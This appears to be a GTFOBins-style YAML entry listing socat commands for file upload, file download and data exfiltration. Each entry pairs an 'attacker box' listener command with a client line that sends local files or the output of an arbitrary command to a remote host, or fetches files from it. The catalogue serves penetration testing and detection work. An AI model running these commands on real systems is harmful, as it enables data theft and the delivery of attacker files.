---
functions:
  file-upload:
    - description: Run `socat -u tcp-listen:4444,reuseaddr open:$NFILE,creat` on the attacker box to collect the file.
      code: |
        socat -u file:$LFILE tcp-connect:$RHOST:$RPORT
  file-download:
    - description: Run `socat -u file:$LFILE tcp-listen:4444,reuseaddr` on the attacker box to send the file.
      code: |
        socat -u tcp-connect:$RHOST:$RPORT open:$NFILE,creat
  data-exfiltration:
    - description: Run `socat -u TCP-LISTEN:4444,fork STDOUT` on the attacker box to output the data or `socat -u TCP-LISTEN:4444,fork CREATE:$NFILE` to save it directly into a file.
      code: |
        cat $LFILE <($CMD) | socat -u STDIN TCP:$RHOST:4444
---
